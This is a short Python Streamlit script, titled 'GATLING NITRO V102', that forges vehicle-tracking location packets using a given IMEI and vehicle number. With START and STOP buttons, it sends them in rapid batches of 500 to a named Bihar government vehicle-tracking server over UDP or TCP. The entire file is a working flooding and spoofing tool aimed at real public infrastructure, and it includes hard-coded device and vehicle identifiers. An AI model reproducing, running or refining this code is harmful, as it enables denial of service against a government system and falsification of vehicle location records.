import streamlit as st
import socket
import time
from datetime import datetime

st.set_page_config(page_title="NITRO V102", layout="wide")
st.title("🚀 GATLING NITRO V102")

if 'firing' not in st.session_state: st.session_state.firing = False
if 'count' not in st.session_state: st.session_state.count = 0

with st.sidebar:
    tag = st.text_input("TAG", "EGAS")
    imei = st.text_input("IMEI", "862567075041793")
    vno = st.text_input("VNO", "BR04GA5974")
    mode = st.radio("MODE", ["UDP", "TCP"])

c1, c2 = st.columns(2)
if c1.button("🔥 START"): st.session_state.firing = True
if c2.button("🛑 STOP"): st.session_state.firing = False

m = st.empty()
if st.session_state.firing:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if mode=="UDP" else socket.SOCK_STREAM)
    target = ("vlts.bihar.gov.in", 9999)
    if mode == "TCP": sock.connect(target)
    
    while st.session_state.firing:
        now = datetime.now()
        pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},25.65,N,84.78,E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*".encode()
        for _ in range(500):
            sock.sendto(pkt, target) if mode=="UDP" else sock.send(pkt)
            st.session_state.count += 1
        m.metric("PACKETS SENT", f"{st.session_state.count:,}")
        time.sleep(0.1)
    sock.close()
